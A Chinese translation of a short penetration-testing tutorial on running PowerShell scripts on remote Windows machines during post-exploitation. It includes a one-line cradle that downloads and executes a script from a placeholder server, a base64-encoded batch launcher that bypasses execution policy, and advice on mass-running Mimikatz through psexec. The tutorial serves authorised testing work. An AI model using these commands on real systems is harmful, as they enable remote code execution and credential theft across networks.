# 【技术分享】Windows环境渗透测试：远程执行PowerShell Payload

##### 译文声明
本文为翻译文章，原文来源：artkond.com  
原文地址：[链接]  
译文仅供参考，具体内容及含义请以原文为准。  
译者：[h4d35](http://bobao.360.cn/member/contribute?uid=1630860495)  
预估稿费：100 RMB  
投稿方式：发送邮件至 linwei#360.cn 或登录网页版在线投稿

在进行Windows环境的渗透测试时，PowerShell是一个非常有用的后渗透工具。例如，在内部测试中，PowerSploit和PowerShell Empire等工具能够提供极大帮助。然而，由于Windows系统默认启用了限制脚本执行的策略，这使得直接运行.ps1脚本变得困难。如果没有管理员权限，你将受限于仅能执行单行且长度有限（如cmd.exe中最大支持8191字符）的PowerShell命令。

### 解决方案一：修改执行策略
一种方法是获取目标机器上的管理员权限，并通过`Set-ExecutionPolicy`命令来放宽或解除对PowerShell脚本执行的限制。请注意，这是一个全局设置，因此完成操作后应恢复原来的设置以避免潜在的安全风险。

### 解决方案二：内存中执行脚本
另一个巧妙的方法是编写一个简单的命令来“评估表达式”，从而实现在内存中执行整个脚本的目的。无论你的.ps1脚本有多大，这种方法都可以让你完整地执行它。下面展示了一个例子，演示如何用一行代码下载并运行powercat：

```powershell
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://yourserver/powercat.ps1')"
```

此方法不受执行策略的影响，因为只涉及单行命令。

### 自动化过程
为了简化在多台Windows计算机上远程执行复杂脚本（如Invoke-Mimikatz.ps1）的过程，可以创建一个批处理文件(.bat)，其中包含base64编码后的PowerShell脚本作为注释部分，随后是一条用于解码并执行该脚本的一行命令。这样就不必手动上传脚本、禁用执行策略、运行脚本后再恢复设置等一系列步骤了。

#### 步骤：
1. 将PowerShell脚本转换成Base64格式。
2. 在.bat文件中添加相应的解码与执行逻辑。
3. 使用psexec.py或其他类似工具传递生成的.bat文件到远程主机并执行。

示例代码片段如下所示：

```batch
@echo off
powershell -nop -exec bypass -enc [Base64EncodedScriptHere]
```

利用上述技术，你可以轻松实现跨多台设备自动化执行mimikatz等功能强大的工具，极大地提高了工作效率。

### 更多技巧
- 启用多个RDP连接：可以在一台工作站上启用多个远程桌面会话，具体脚本可参考相关资源。

希望这些信息对你有所帮助！更多详细资料，请参阅原始文档。